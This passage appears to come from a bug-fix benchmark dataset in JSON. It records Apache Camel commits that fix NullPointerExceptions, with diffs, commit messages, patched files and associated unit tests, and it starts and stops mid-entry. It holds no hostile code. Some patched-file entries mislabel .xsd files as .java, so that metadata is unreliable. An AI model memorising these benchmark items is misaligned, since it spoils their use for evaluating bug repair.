                "patch": "@@ -80,6 +80,10 @@ private KMSOperations determineOperation(Exchange exchange) {\n         if (operation == null) {\n             operation = getConfiguration().getOperation();\n         }\n+\n+        if (ObjectHelper.isEmpty(operation)) {\n+            throw new IllegalArgumentException(\"Operation must be specified\");\n+        }\n         return operation;\n     }\n ",
                "raw_url": "https://github.com/apache/camel/raw/24e4451567b6f023bb77bd42cecab29a2aa722cb/components/camel-aws-kms/src/main/java/org/apache/camel/component/aws/kms/KMSProducer.java",
                "sha": "c12a5eb22c3101f2f8412dee6f55642907cf11cb",
                "status": "modified"
            }
        ],
        "message": "Npe fix",
        "parent": "https://github.com/apache/camel/commit/d4bb6ddb01c4e543d5f3c28a25a39db8c8833a41",
        "patched_files": [
            "KMSProducer.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "KMSProducerTest.java"
        ]
    },
    "camel_25423af": {
        "bug_id": "camel_25423af",
        "commit": "https://github.com/apache/camel/commit/25423af4ff459ea261e1f081bc810bb921bd054f",
        "file": [
            {
                "additions": 5,
                "blob_url": "https://github.com/apache/camel/blob/25423af4ff459ea261e1f081bc810bb921bd054f/components/camel-sjms/src/main/java/org/apache/camel/component/sjms/batch/SjmsBatchConsumer.java",
                "changes": 10,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-sjms/src/main/java/org/apache/camel/component/sjms/batch/SjmsBatchConsumer.java?ref=25423af4ff459ea261e1f081bc810bb921bd054f",
                "deletions": 5,
                "filename": "components/camel-sjms/src/main/java/org/apache/camel/component/sjms/batch/SjmsBatchConsumer.java",
                "patch": "@@ -73,7 +73,7 @@\n     private ExecutorService jmsConsumerExecutors;\n     private final AtomicBoolean running = new AtomicBoolean(false);\n     private final AtomicReference<CountDownLatch> consumersShutdownLatchRef = new AtomicReference<>();\n-    private Connection connection;\n+    private volatile Connection connection;\n \n     public SjmsBatchConsumer(SjmsBatchEndpoint sjmsBatchEndpoint, Processor processor) {\n         super(sjmsBatchEndpoint, processor);\n@@ -177,16 +177,16 @@ public void run() {\n                     localConnection = connectionFactory.createConnection();\n                     localConnection.start();\n \n+                    // its success so prepare for exit\n+                    connection = localConnection;\n+\n                     final List<AtomicBoolean> triggers = new ArrayList<>();\n                     for (int i = 0; i < consumerCount; i++) {\n                         BatchConsumptionLoop loop = new BatchConsumptionLoop();\n                         triggers.add(loop.getCompletionTimeoutTrigger());\n-                        jmsConsumerExecutors.execute(loop);\n+                        jmsConsumerExecutors.submit(loop);\n                     }\n \n-                    // its success so prepare for exit\n-                    connection = localConnection;\n-\n                     if (completionInterval > 0) {\n                         // trigger completion based on interval\n                         timeoutCheckerExecutorService.scheduleAtFixedRate(new CompletionIntervalTask(triggers), completionInterval, completionInterval, TimeUnit.MILLISECONDS);",
                "raw_url": "https://github.com/apache/camel/raw/25423af4ff459ea261e1f081bc810bb921bd054f/components/camel-sjms/src/main/java/org/apache/camel/component/sjms/batch/SjmsBatchConsumer.java",
                "sha": "630bdfb848abd9ea665f1f7eb48709d8c2b75266",
                "status": "modified"
            }
        ],
        "message": "CAMEL-10677: Fixed NPE in camel-sjms batch consumer. And use submit for the consumer task as it should not risk using the starter thread which execute can do.",
        "parent": "https://github.com/apache/camel/commit/15256c88a35c8decfb63de9c0ea1ddc4d6c667fc",
        "patched_files": [
            "SjmsBatchConsumer.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "SjmsBatchConsumerTest.java"
        ]
    },
    "camel_25f5737": {
        "bug_id": "camel_25f5737",
        "commit": "https://github.com/apache/camel/commit/25f5737e2a4b6a33c2cbef993d183ac3812e16f2",
        "file": [
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/25f5737e2a4b6a33c2cbef993d183ac3812e16f2/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/transport/CamelDestination.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/transport/CamelDestination.java?ref=25f5737e2a4b6a33c2cbef993d183ac3812e16f2",
                "deletions": 1,
                "filename": "components/camel-cxf/src/main/java/org/apache/camel/component/cxf/transport/CamelDestination.java",
                "patch": "@@ -98,7 +98,7 @@ public void activate() {\n \n         try {\n             getLogger().log(Level.FINE, \"establishing Camel connection\");\n-            distinationEndpoint = camelContext.getEndpoint(camelDestinationUri);\n+            distinationEndpoint = getCamelContext().getEndpoint(camelDestinationUri);\n             consumer = distinationEndpoint.createConsumer(new ConsumerProcessor());\n             consumer.start();\n ",
                "raw_url": "https://github.com/apache/camel/raw/25f5737e2a4b6a33c2cbef993d183ac3812e16f2/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/transport/CamelDestination.java",
                "sha": "2c5f36e0d2502d424d187bf9ec8600a348c426d2",
                "status": "modified"
            }
        ],
        "message": "Fixed the NPE error of CamelDestination\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@816892 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/b2141b1c311b5078d9b8cdf73ef802cdea89b9bd",
        "patched_files": [
            "CamelDestination.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "CamelDestinationTest.java"
        ]
    },
    "camel_26088b4": {
        "bug_id": "camel_26088b4",
        "commit": "https://github.com/apache/camel/commit/26088b49719aeaaf4bc00310b9c1e507375aef91",
        "file": [
            {
                "additions": 8,
                "blob_url": "https://github.com/apache/camel/blob/26088b49719aeaaf4bc00310b9c1e507375aef91/camel-core/src/main/java/org/apache/camel/component/validator/DefaultLSResourceResolver.java",
                "changes": 17,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/component/validator/DefaultLSResourceResolver.java?ref=26088b49719aeaaf4bc00310b9c1e507375aef91",
                "deletions": 9,
                "filename": "camel-core/src/main/java/org/apache/camel/component/validator/DefaultLSResourceResolver.java",
                "patch": "@@ -66,13 +66,16 @@ public LSInput resolveResource(String type, String namespaceURI, String publicId\n         // Build up the relative path for using relatedURI and baseURI\n         if (baseURI == null) {\n             relatedURI = getUri(systemId);\n-            resourceURI = relatedURI.intern();\n+            resourceURI = relatedURI;\n         } else {\n             String relatedPath = relatedURIMap.get(baseURI);\n             if (relatedPath == null) {\n-                relatedPath = FileUtil.onlyPath(relatedURI).intern();\n+                relatedPath = FileUtil.onlyPath(relatedURI);\n+                if (relatedPath == null) {\n+                    relatedPath = \"\";\n+                }\n                 relatedURI = FileUtil.onlyPath(relatedURI) + \"/\" + systemId;\n-                resourceURI = relatedURI.intern();\n+                resourceURI = relatedURI;\n                 relatedURIMap.put(baseURI, relatedPath);\n             } else { \n                 resourceURI = relatedPath + \"/\" + systemId;\n@@ -88,7 +91,6 @@ public LSInput resolveResource(String type, String namespaceURI, String publicId\n         private final String baseURI;\n         private final String relatedURI;\n         private final String uri;\n-        \n \n         private DefaultLSInput(String publicId, String systemId, String basedURI, String relatedURI) {\n             this.publicId = publicId;\n@@ -97,8 +99,7 @@ private DefaultLSInput(String publicId, String systemId, String basedURI, String\n             this.relatedURI = relatedURI;\n             this.uri = getInputUri();\n         }\n-        \n-        \n+\n         private String getInputUri() {\n             // find the xsd with relative path\n             if (ObjectHelper.isNotEmpty(relatedURI)) {\n@@ -204,7 +205,5 @@ public String toString() {\n             return \"DefaultLSInput[\" + uri + \"]\";\n         }\n     }\n-    \n-    \n-    \n+\n }",
                "raw_url": "https://github.com/apache/camel/raw/26088b49719aeaaf4bc00310b9c1e507375aef91/camel-core/src/main/java/org/apache/camel/component/validator/DefaultLSResourceResolver.java",
                "sha": "a8048a5e2b1c2b5f7f7da56341fb5280548a7889",
                "status": "modified"
            },
            {
                "additions": 60,
                "blob_url": "https://github.com/apache/camel/blob/26088b49719aeaaf4bc00310b9c1e507375aef91/camel-core/src/test/java/org/apache/camel/component/validator/ValidatorRootPathTest.java",
                "changes": 60,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/component/validator/ValidatorRootPathTest.java?ref=26088b49719aeaaf4bc00310b9c1e507375aef91",
                "deletions": 0,
                "filename": "camel-core/src/test/java/org/apache/camel/component/validator/ValidatorRootPathTest.java",
                "patch": "@@ -0,0 +1,60 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+package org.apache.camel.component.validator;\n+\n+import org.apache.camel.ContextTestSupport;\n+import org.apache.camel.builder.RouteBuilder;\n+import org.apache.camel.component.mock.MockEndpoint;\n+\n+public class ValidatorRootPathTest extends ContextTestSupport {\n+\n+    protected MockEndpoint validEndpoint;\n+    protected MockEndpoint invalidEndpoint;\n+\n+    public void testRootPath() throws Exception {\n+        validEndpoint.expectedMessageCount(1);\n+        invalidEndpoint.expectedMessageCount(0);\n+\n+        template.sendBody(\n+                \"direct:rootPath\",\n+                \"<report xmlns='http://foo.com/report' xmlns:rb='http://foo.com/report-base'><author><rb:name>Knuth</rb:name></author><content><rb:chapter><rb:subject></rb:subject>\"\n+                        + \"<rb:abstract></rb:abstract><rb:body></rb:body></rb:chapter></content></report>\");\n+\n+        MockEndpoint.assertIsSatisfied(validEndpoint, invalidEndpoint);\n+    }\n+\n+    @Override\n+    protected void setUp() throws Exception {\n+        super.setUp();\n+\n+        validEndpoint = resolveMandatoryEndpoint(\"mock:valid\", MockEndpoint.class);\n+        invalidEndpoint = resolveMandatoryEndpoint(\"mock:invalid\", MockEndpoint.class);\n+    }\n+\n+    @Override\n+    protected RouteBuilder createRouteBuilder() throws Exception {\n+        return new RouteBuilder() {\n+            @Override\n+            public void configure() throws Exception {\n+                from(\"direct:rootPath\")\n+                    .to(\"validator:report.xsd\")\n+                    .to(\"mock:valid\");\n+            }\n+        };\n+    }\n+\n+}",
                "raw_url": "https://github.com/apache/camel/raw/26088b49719aeaaf4bc00310b9c1e507375aef91/camel-core/src/test/java/org/apache/camel/component/validator/ValidatorRootPathTest.java",
                "sha": "87dd8bdc96a345f31a140ab4628bafa6ad79e4f9",
                "status": "added"
            },
            {
                "additions": 46,
                "blob_url": "https://github.com/apache/camel/blob/26088b49719aeaaf4bc00310b9c1e507375aef91/camel-core/src/test/resources/report-base.xsd",
                "changes": 46,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/resources/report-base.xsd?ref=26088b49719aeaaf4bc00310b9c1e507375aef91",
                "deletions": 0,
                "filename": "camel-core/src/test/resources/report-base.xsd",
                "patch": "@@ -0,0 +1,46 @@\n+<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n+<!--\n+    Licensed to the Apache Software Foundation (ASF) under one or more\n+    contributor license agreements.  See the NOTICE file distributed with\n+    this work for additional information regarding copyright ownership.\n+    The ASF licenses this file to You under the Apache License, Version 2.0\n+    (the \"License\"); you may not use this file except in compliance with\n+    the License.  You may obtain a copy of the License at\n+\n+    http://www.apache.org/licenses/LICENSE-2.0\n+\n+    Unless required by applicable law or agreed to in writing, software\n+    distributed under the License is distributed on an \"AS IS\" BASIS,\n+    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+    See the License for the specific language governing permissions and\n+    limitations under the License.\n+-->\n+<xs:schema elementFormDefault=\"qualified\" version=\"1.0\"\n+           targetNamespace=\"http://foo.com/report-base\"\n+           xmlns:tns=\"http://foo.com/report-base\"\n+           xmlns:xs=\"http://www.w3.org/2001/XMLSchema\">\n+\n+\n+  <xs:element name=\"content\" type=\"tns:content\" />\n+  \n+  <xs:complexType name=\"content\">\n+  \t<xs:sequence>\n+  \t\t<xs:element name=\"chapter\" type=\"tns:chapter\" maxOccurs=\"unbounded\" />\n+  \t</xs:sequence>\n+  </xs:complexType>\n+\t  \n+  <xs:complexType name=\"chapter\">\n+    <xs:sequence>\n+      <xs:element name=\"subject\" type=\"xs:string\"/>\n+      <xs:element name=\"abstract\" type=\"xs:string\"/>\n+      <xs:element name=\"body\" type=\"xs:string\"/>\n+    </xs:sequence>\n+  </xs:complexType>\n+\n+  <xs:complexType name=\"person\">\n+    <xs:sequence>\n+      <xs:element name=\"name\" type=\"xs:string\"/>\n+      <xs:element name=\"email\" type=\"xs:string\" minOccurs=\"0\"/>\n+    </xs:sequence>\n+  </xs:complexType>\n+</xs:schema>\n\\ No newline at end of file",
                "raw_url": "https://github.com/apache/camel/raw/26088b49719aeaaf4bc00310b9c1e507375aef91/camel-core/src/test/resources/report-base.xsd",
                "sha": "6afabcf9b8435daae8d5365b0e62793929909a03",
                "status": "added"
            },
            {
                "additions": 34,
                "blob_url": "https://github.com/apache/camel/blob/26088b49719aeaaf4bc00310b9c1e507375aef91/camel-core/src/test/resources/report.xsd",
                "changes": 34,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/resources/report.xsd?ref=26088b49719aeaaf4bc00310b9c1e507375aef91",
                "deletions": 0,
                "filename": "camel-core/src/test/resources/report.xsd",
                "patch": "@@ -0,0 +1,34 @@\n+<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n+<!--\n+    Licensed to the Apache Software Foundation (ASF) under one or more\n+    contributor license agreements.  See the NOTICE file distributed with\n+    this work for additional information regarding copyright ownership.\n+    The ASF licenses this file to You under the Apache License, Version 2.0\n+    (the \"License\"); you may not use this file except in compliance with\n+    the License.  You may obtain a copy of the License at\n+\n+    http://www.apache.org/licenses/LICENSE-2.0\n+\n+    Unless required by applicable law or agreed to in writing, software\n+    distributed under the License is distributed on an \"AS IS\" BASIS,\n+    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+    See the License for the specific language governing permissions and\n+    limitations under the License.\n+-->\n+<xs:schema elementFormDefault=\"qualified\" version=\"1.0\"\n+           targetNamespace=\"http://foo.com/report\"\n+           xmlns:rb=\"http://foo.com/report-base\"\n+           xmlns:xs=\"http://www.w3.org/2001/XMLSchema\">\n+\n+  <xs:import namespace=\"http://foo.com/report-base\" schemaLocation=\"report-base.xsd\"/>\n+\n+  <xs:element name=\"report\">\n+    <xs:complexType>\n+      <xs:sequence>\n+        <xs:element name=\"author\" type=\"rb:person\" maxOccurs=\"unbounded\"/>\n+        <xs:element name=\"content\" type=\"rb:content\"/>\n+        <xs:any namespace=\"##any\" processContents=\"lax\" minOccurs=\"0\" maxOccurs=\"unbounded\"/>\n+      </xs:sequence>\n+    </xs:complexType>\n+  </xs:element>\n+</xs:schema>\n\\ No newline at end of file",
                "raw_url": "https://github.com/apache/camel/raw/26088b49719aeaaf4bc00310b9c1e507375aef91/camel-core/src/test/resources/report.xsd",
                "sha": "c7413a0808b8c3fc8795f9b0aa684e2373a2eba5",
                "status": "added"
            }
        ],
        "message": "CAMEL-6538: NPE in validator component if no classpath prefix",
        "parent": "https://github.com/apache/camel/commit/41510d91416c7e16608ca905ebc2740c1663c734",
        "patched_files": [
            "report-base.java",
            "report.java",
            "DefaultLSResourceResolver.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "ValidatorRootPathTest.java"
        ]
    },
    "camel_272bf7a": {
        "bug_id": "camel_272bf7a",
        "commit": "https://github.com/apache/camel/commit/272bf7a7bb05d19c1cfadb1efcb8ba3b4925e054",
        "file": [
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/272bf7a7bb05d19c1cfadb1efcb8ba3b4925e054/camel-core/src/test/java/org/apache/camel/component/rest/RestEndpointTest.java",
                "changes": 1,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/component/rest/RestEndpointTest.java?ref=272bf7a7bb05d19c1cfadb1efcb8ba3b4925e054",
                "deletions": 0,
                "filename": "camel-core/src/test/java/org/apache/camel/component/rest/RestEndpointTest.java",
                "patch": "@@ -65,6 +65,7 @@ public void shouldConfigureBindingMode() throws Exception {\n         final RestEndpoint restEndpoint = new RestEndpoint(\"rest:GET:/path\", restComponent);\n         restEndpoint.setComponentName(\"mock-rest\");\n         restEndpoint.setParameters(new HashMap<>());\n+        restEndpoint.setHost(\"http://localhost\");\n \n         restEndpoint.setBindingMode(RestBindingMode.json);\n ",
                "raw_url": "https://github.com/apache/camel/raw/272bf7a7bb05d19c1cfadb1efcb8ba3b4925e054/camel-core/src/test/java/org/apache/camel/component/rest/RestEndpointTest.java",
                "sha": "57f52ab6f575b186cadf80a4955671619a257ca7",
                "status": "modified"
            }
        ],
        "message": "CAMEL-11216: REST-DSL - Producer fails with NPE or other exceptions if you have not set a hostname",
        "parent": "https://github.com/apache/camel/commit/ca5d9e129d447d99b2f1abb7ccd357c1a96b889a",
        "patched_files": [
            "RestEndpoint.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "RestEndpointTest.java"
        ]
    },
    "camel_29591bf": {
        "bug_id": "camel_29591bf",
        "commit": "https://github.com/apache/camel/commit/29591bff3d7ababb5c72909bb99cfcc0d4f66cba",
        "file": [
            {
                "additions": 49,
                "blob_url": "https://github.com/apache/camel/blob/29591bff3d7ababb5c72909bb99cfcc0d4f66cba/camel-core/src/test/java/org/apache/camel/component/mock/MockXpathTest.java",
                "changes": 49,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/component/mock/MockXpathTest.java?ref=29591bff3d7ababb5c72909bb99cfcc0d4f66cba",
                "deletions": 0,
                "filename": "camel-core/src/test/java/org/apache/camel/component/mock/MockXpathTest.java",
                "patch": "@@ -0,0 +1,49 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+package org.apache.camel.component.mock;\n+\n+import org.apache.camel.ContextTestSupport;\n+import org.apache.camel.builder.RouteBuilder;\n+import org.apache.camel.model.language.XPathExpression;\n+\n+public class MockXpathTest extends ContextTestSupport {\n+\n+    public void testXpathAssertion() throws Exception {\n+        MockEndpoint result = getMockEndpoint(\"mock:result\");\n+        result.expectedMessageCount(1);\n+        \n+        XPathExpression xpath = new XPathExpression(\"/foo = 'bar'\");\n+        xpath.setResultType(Boolean.class);\n+        result.allMessages().body().matches(xpath);        \n+               \n+        template.sendBody(\"direct:start\", \"<foo>bar</foo>\");\n+\n+        \n+        assertMockEndpointsSatisfied();\n+    }\n+\n+    @Override\n+    protected RouteBuilder createRouteBuilder() throws Exception {\n+        return new RouteBuilder() {\n+            @Override\n+            public void configure() throws Exception {\n+                from(\"direct:start\").to(\"mock:result\");\n+            }\n+        };\n+    }\n+\n+}",
                "raw_url": "https://github.com/apache/camel/raw/29591bff3d7ababb5c72909bb99cfcc0d4f66cba/camel-core/src/test/java/org/apache/camel/component/mock/MockXpathTest.java",
                "sha": "fc28c0694c4d74ef7023c7434b0c1c4cb176bcff",
                "status": "added"
            }
        ],
        "message": "CAMEL-2520 fixed the NPE error of MockXpathTest\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@918917 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/cbc57a5937e7408900e94bf734b4d1e3aadc112f",
        "patched_files": [],
        "repo": "camel",
        "unit_tests": [
            "MockXpathTest.java"
        ]
    },
    "camel_2999f9e": {
        "bug_id": "camel_2999f9e",
        "commit": "https://github.com/apache/camel/commit/2999f9e76cf4310d4142755baff67732d8f01b93",
        "file": [
            {
                "additions": 2,
                "blob_url": "https://github.com/apache/camel/blob/2999f9e76cf4310d4142755baff67732d8f01b93/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "changes": 3,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java?ref=2999f9e76cf4310d4142755baff67732d8f01b93",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "patch": "@@ -3041,7 +3041,8 @@ public void start() throws Exception {\n                 // count how many routes are actually started\n                 int started = 0;\n                 for (Route route : getRoutes()) {\n-                    if (getRouteStatus(route.getId()).isStarted()) {\n+                    ServiceStatus status = getRouteStatus(route.getId());\n+                    if (status != null && status.isStarted()) {\n                         started++;\n                     }\n                 }",
                "raw_url": "https://github.com/apache/camel/raw/2999f9e76cf4310d4142755baff67732d8f01b93/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "sha": "65c181df80710698cfd80c9b40c9bf5a36b5fad3",
                "status": "modified"
            },
            {
                "additions": 6,
                "blob_url": "https://github.com/apache/camel/blob/2999f9e76cf4310d4142755baff67732d8f01b93/camel-core/src/test/java/org/apache/camel/processor/onexception/OnExceptionGlobalScopedRecursionTest.java",
                "changes": 12,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/processor/onexception/OnExceptionGlobalScopedRecursionTest.java?ref=2999f9e76cf4310d4142755baff67732d8f01b93",
                "deletions": 6,
                "filename": "camel-core/src/test/java/org/apache/camel/processor/onexception/OnExceptionGlobalScopedRecursionTest.java",
                "patch": "@@ -42,7 +42,7 @@ public void configure() throws Exception {\n                     .to(\"mock:c\")\n                     .log(\"onException\")\n                     .throwException(new NullPointerException(\"A NPE error here\"))\n-                .end();\n+                    .end();\n \n                 from(\"direct:test\")\n                     .to(\"mock:a\")\n@@ -78,7 +78,7 @@ public void configure() throws Exception {\n                     .to(\"mock:c\")\n                     .log(\"onException\")\n                     .throwException(new NullPointerException(\"A NPE error here\"))\n-                .end();\n+                    .end();\n \n                 from(\"direct:test\")\n                     .to(\"mock:a\")\n@@ -114,7 +114,7 @@ public void configure() throws Exception {\n                     .to(\"mock:c\")\n                     .log(\"onException\")\n                     .to(\"direct:error\")\n-                .end();\n+                    .end();\n \n                 from(\"direct:test\")\n                     .to(\"mock:a\")\n@@ -157,7 +157,7 @@ public void configure() throws Exception {\n                     .to(\"mock:c\")\n                     .log(\"onException\")\n                     .to(\"direct:error\")\n-                .end();\n+                    .end();\n \n                 from(\"direct:test\")\n                     .to(\"mock:a\")\n@@ -199,7 +199,7 @@ public void configure() throws Exception {\n                     .to(\"mock:c\")\n                     .log(\"onException\")\n                     .to(\"direct:error\")\n-                .end();\n+                    .end();\n \n                 from(\"direct:test\")\n                     .to(\"mock:a\")\n@@ -239,7 +239,7 @@ public void configure() throws Exception {\n                     .to(\"mock:c\")\n                     .log(\"onException\")\n                     .to(\"direct:error\")\n-                .end();\n+                    .end();\n \n                 from(\"direct:test\")\n                     .to(\"mock:a\")",
                "raw_url": "https://github.com/apache/camel/raw/2999f9e76cf4310d4142755baff67732d8f01b93/camel-core/src/test/java/org/apache/camel/processor/onexception/OnExceptionGlobalScopedRecursionTest.java",
                "sha": "37f6088d83ce94c6fadb958b652b6185674c69b6",
                "status": "modified"
            },
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/2999f9e76cf4310d4142755baff67732d8f01b93/camel-core/src/test/java/org/apache/camel/processor/onexception/OnExceptionRecursionTest.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/processor/onexception/OnExceptionRecursionTest.java?ref=2999f9e76cf4310d4142755baff67732d8f01b93",
                "deletions": 1,
                "filename": "camel-core/src/test/java/org/apache/camel/processor/onexception/OnExceptionRecursionTest.java",
                "patch": "@@ -68,7 +68,7 @@ public void configure() throws Exception {\n             assertEquals(\"Bad state\", ise.getMessage());\n         }\n \n-         assertMockEndpointsSatisfied();\n+        assertMockEndpointsSatisfied();\n     }\n \n     public void testRecursionDirectNoErrorHandler() throws Exception {",
                "raw_url": "https://github.com/apache/camel/raw/2999f9e76cf4310d4142755baff67732d8f01b93/camel-core/src/test/java/org/apache/camel/processor/onexception/OnExceptionRecursionTest.java",
                "sha": "d832296ee5baa63e23c1a038af1a32a1cf8cd1f8",
                "status": "modified"
            }
        ],
        "message": "CAMEL-11234: NullPointerException while trying to get the Route Status on startup",
        "parent": "https://github.com/apache/camel/commit/a1830d5a2788ec26b34e48732026b3d706f615dd",
        "patched_files": [
            "DefaultCamelContext.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "DefaultCamelContextTest.java",
            "OnExceptionRecursionTest.java",
            "OnExceptionGlobalScopedRecursionTest.java"
        ]
    },
    "camel_2c5e316": {
        "bug_id": "camel_2c5e316",
        "commit": "https://github.com/apache/camel/commit/2c5e3167c21e29c752a7b4b38be4a80850f1e169",
        "file": [
            {
                "additions": 1,
                "blob_url": "https://github.com/apache/camel/blob/2c5e3167c21e29c752a7b4b38be4a80850f1e169/components/camel-http/src/main/java/org/apache/camel/component/http/RequestEntityConverter.java",
                "changes": 2,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-http/src/main/java/org/apache/camel/component/http/RequestEntityConverter.java?ref=2c5e3167c21e29c752a7b4b38be4a80850f1e169",
                "deletions": 1,
                "filename": "components/camel-http/src/main/java/org/apache/camel/component/http/RequestEntityConverter.java",
                "patch": "@@ -48,7 +48,7 @@ public static RequestEntity toRequestEntity(InputStream inStream, Exchange excha\n \n     @Converter\n     public static RequestEntity toRequestEntity(String str, Exchange exchange) throws Exception {\n-        if (GZIPHelper.isGzip(exchange.getIn())) {\n+        if (exchange != null && GZIPHelper.isGzip(exchange.getIn())) {\n             byte[] data = exchange.getContext().getTypeConverter().convertTo(byte[].class, str);\n             return asRequestEntity(data, exchange);\n         } else {",
                "raw_url": "https://github.com/apache/camel/raw/2c5e3167c21e29c752a7b4b38be4a80850f1e169/components/camel-http/src/main/java/org/apache/camel/component/http/RequestEntityConverter.java",
                "sha": "92f0abb21d8e1cb6a545966169b2da90c1d4062e",
                "status": "modified"
            },
            {
                "additions": 2,
                "blob_url": "https://github.com/apache/camel/blob/2c5e3167c21e29c752a7b4b38be4a80850f1e169/components/camel-jaxb/src/main/java/org/apache/camel/converter/jaxb/FallbackTypeConverter.java",
                "changes": 3,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-jaxb/src/main/java/org/apache/camel/converter/jaxb/FallbackTypeConverter.java?ref=2c5e3167c21e29c752a7b4b38be4a80850f1e169",
                "deletions": 1,
                "filename": "components/camel-jaxb/src/main/java/org/apache/camel/converter/jaxb/FallbackTypeConverter.java",
                "patch": "@@ -219,7 +219,8 @@ protected void doStop() throws Exception {\n             } else {\n                 marshaller.marshal(value, buffer);\n             }\n-            answer = parentTypeConverter.convertTo(type, buffer.toString());\n+            // we need to pass the exchange\n+            answer = parentTypeConverter.convertTo(type, exchange, buffer.toString());\n         }\n \n         return answer;",
                "raw_url": "https://github.com/apache/camel/raw/2c5e3167c21e29c752a7b4b38be4a80850f1e169/components/camel-jaxb/src/main/java/org/apache/camel/converter/jaxb/FallbackTypeConverter.java",
                "sha": "d882f251614de7a1eb195ca662a5cd758da9aa1e",
                "status": "modified"
            },
            {
                "additions": 50,
                "blob_url": "https://github.com/apache/camel/blob/2c5e3167c21e29c752a7b4b38be4a80850f1e169/tests/camel-itest/src/test/java/org/apache/camel/itest/jaxb/JaxbFallbackTypeConverterTest.java",
                "changes": 50,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/tests/camel-itest/src/test/java/org/apache/camel/itest/jaxb/JaxbFallbackTypeConverterTest.java?ref=2c5e3167c21e29c752a7b4b38be4a80850f1e169",
                "deletions": 0,
                "filename": "tests/camel-itest/src/test/java/org/apache/camel/itest/jaxb/JaxbFallbackTypeConverterTest.java",
                "patch": "@@ -0,0 +1,50 @@\n+package org.apache.camel.itest.jaxb;\n+\n+import java.io.InputStream;\n+\n+import org.apache.camel.Exchange;\n+import org.apache.camel.Message;\n+import org.apache.camel.Processor;\n+import org.apache.camel.builder.RouteBuilder;\n+import org.apache.camel.itest.jaxb.example.Bar;\n+import org.apache.camel.test.junit4.CamelTestSupport;\n+import org.apache.commons.httpclient.methods.RequestEntity;\n+import org.junit.Test;\n+\n+public class JaxbFallbackTypeConverterTest extends CamelTestSupport {\n+    \n+    @Test\n+    public void testJaxbFallbackTypeConverter() {\n+        Bar bar = new Bar();\n+        bar.setName(\"camel\");\n+        bar.setValue(\"cool\");\n+        String result = template.requestBody(\"direct:start\", bar, String.class);\n+        assertNotNull(result);\n+        assertTrue(\"Get a wrong xml string\", result.indexOf(\"<bar name=\\\"camel\\\" value=\\\"cool\\\"/>\") > 0);\n+    }\n+    \n+    @Override\n+    protected RouteBuilder createRouteBuilder() throws Exception {\n+\n+        return new RouteBuilder() {\n+            @Override\n+            public void configure() throws Exception {\n+\n+                from(\"direct:start\").process(new Processor() {\n+\n+                    @Override\n+                    public void process(Exchange exchange) throws Exception {\n+                        Message in = exchange.getIn();\n+                        RequestEntity entity = in.getBody(RequestEntity.class);\n+                        assertNull(\"We should not get the entity here\", entity);\n+                        InputStream is = in.getMandatoryBody(InputStream.class);\n+                        // make sure we can 